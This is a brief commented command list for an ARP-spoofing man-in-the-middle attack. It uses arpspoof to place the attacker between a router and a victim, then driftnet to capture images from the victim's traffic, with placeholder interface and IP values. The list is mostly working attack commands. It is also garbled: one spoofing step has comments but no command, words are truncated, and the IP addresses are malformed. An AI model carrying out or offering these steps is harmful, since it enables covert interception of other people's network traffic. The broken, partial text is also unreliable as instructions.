# Spoofing connection between Victim and Router
# After executing the command let it run on its own and do not close the termina

# Spoofing connection between Router and Victim. Similar to what we did in the previous step but order is different.
#  After executing the command let it run on its own and do not close the termina
arpspoof -i [Network Interface Name] -t [Router IP] [Victim IP]

# Execute driftnet to sniff images
# Note: Run this command in a new terminal and let it running
driftnet -i [Network Interface Name]

# Disable port forwarding once you're done with the attack
sysctl -w net.ipv4.ip_forward=0

# It is good practice to open a text editor and notate the information separately. So that it can copied easily for command execution.
# [Network Interface Name] = wlan0
# [Victim IP] = 192.000.xx
# [Router IP] = 192.000.1
